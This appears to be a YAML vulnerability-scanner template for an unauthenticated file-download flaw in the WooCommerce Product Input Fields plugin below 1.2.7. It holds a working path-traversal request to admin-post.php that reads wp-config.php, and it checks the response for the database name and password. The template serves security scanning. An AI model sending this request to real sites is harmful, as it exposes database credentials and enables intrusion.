id: wp-woocommerce-file-download
brief:
    title: Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download
    by: 0x_Akoko
    level: high
    about: WordPress WooCommerce < 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated...
    label:
        - wordpress
        - woocommerce
        - lfi
        - wp-plugin
        - wp
        - vuln
    score: CVSS:8.6
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php'
      signs:
        - "on": word
          has:
            - DB_NAME
            - DB_PASSWORD
          in: body
          need: all
        - "on": status
          status:
            - 200
